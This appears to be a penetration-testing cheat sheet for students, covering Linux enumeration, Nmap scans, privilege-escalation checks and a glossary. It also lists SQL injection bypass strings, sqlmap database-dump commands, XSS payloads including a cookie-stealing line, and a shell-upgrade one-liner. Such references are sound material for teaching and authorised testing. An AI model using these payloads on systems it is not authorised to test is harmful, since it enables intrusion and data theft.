Quick Command Reference

The most commonly used commands across all modules — copy and go.

bash — Linux Essentials 
# User & System Info
id                        # current user + groups
whoami                    # just the username
uname -a                  # kernel + arch info
hostname                  # machine hostname
cat /etc/os-release       # distro version

# File System Navigation
ls -la                    # list all files with perms
find / -name "*.conf" 2>/dev/null   # find config files
find / -perm -4000 -type f 2>/dev/null  # find SUID files
locate filename           # fast file search

# Networking
ip a                      # IP addresses
ss -tulnp                 # open ports + services
netstat -antp             # connection table
cat /etc/hosts            # host file entries

# Process & Service
ps aux                    # all running processes
systemctl list-units --type=service  # all services
kill -9 <PID>             # force kill process
bash — Nmap Scanning 
# Host Discovery
nmap -sn 192.168.1.0/24          # ping sweep (no port scan)
nmap -Pn <target>                # skip host discovery

# Port Scanning
nmap -p- <target>                # all 65535 ports
nmap -p 22,80,443 <target>       # specific ports
nmap --top-ports 1000 <target>   # top 1000 ports

# Service & Version Detection
nmap -sV <target>                # service versions
nmap -sC <target>                # default scripts
nmap -A <target>                 # aggressive (OS+scripts+versions)

# Stealth & Output
nmap -sS <target>                # SYN stealth scan
nmap -oN output.txt <target>     # save normal output
nmap -oX output.xml <target>     # save XML output
nmap --script vuln <target>      # vuln scan scripts
bash — Privilege Escalation 
# Initial Enumeration
sudo -l                           # what can I sudo?
cat /etc/passwd                   # user list
cat /etc/crontab                  # scheduled tasks
env                               # environment variables

# SUID / SGID Abuse
find / -perm -u=s -type f 2>/dev/null   # SUID files
find / -perm -g=s -type f 2>/dev/null   # SGID files

# World-Writable Paths
find / -writable -type d 2>/dev/null    # writable dirs
find / -writable -type f 2>/dev/null    # writable files

# Capabilities
getcap -r / 2>/dev/null           # check capabilities

# Automated Recon
./linpeas.sh                      # PEASS-ng Linux
./linux-smart-enumeration/lse.sh  # LSE script
python3 -c 'import pty;pty.spawn("/bin/bash")'  # shell upgrade
bash / payload — Web Security 
# SQL Injection — Detection
'                             # basic syntax break test
' OR '1'='1                   # always-true bypass
' OR '1'='1'--                # comment out query end
admin'--                      # auth bypass username

# SQLMap Automation
sqlmap -u "http://site.com/page?id=1" --dbs        # list DBs
sqlmap -u "http://site.com/page?id=1" -D db --tables  # tables
sqlmap -u "http://site.com/page?id=1" --dump       # dump data

# XSS Payloads
<script>alert(1)</script>    # basic reflected
<img src=x onerror=alert(1)> # img tag bypass
javascript:alert(document.cookie)  # cookie steal

# Directory Brute-Force
gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -u http://target/FUZZ -w wordlist.txt

Key Concepts at a Glance

Critical security terms and definitions you should know cold.

SUID Set-User-ID — runs a file as its owner, not the caller. Classic PrivEsc vector.
RCE Remote Code Execution — attacker runs arbitrary code on the target system.
XSS Cross-Site Scripting — injecting malicious scripts into web pages viewed by other users.
SQLi SQL Injection — inserting malicious SQL code into queries to manipulate the database.
IDOR Insecure Direct Object Reference — accessing data of other users by modifying IDs.
LFI Local File Inclusion — including server-side files in the application output.
SSRF Server-Side Request Forgery — forging requests from the server to internal resources.
CVE Common Vulnerabilities and Exposures — a public identifier for known security flaws.
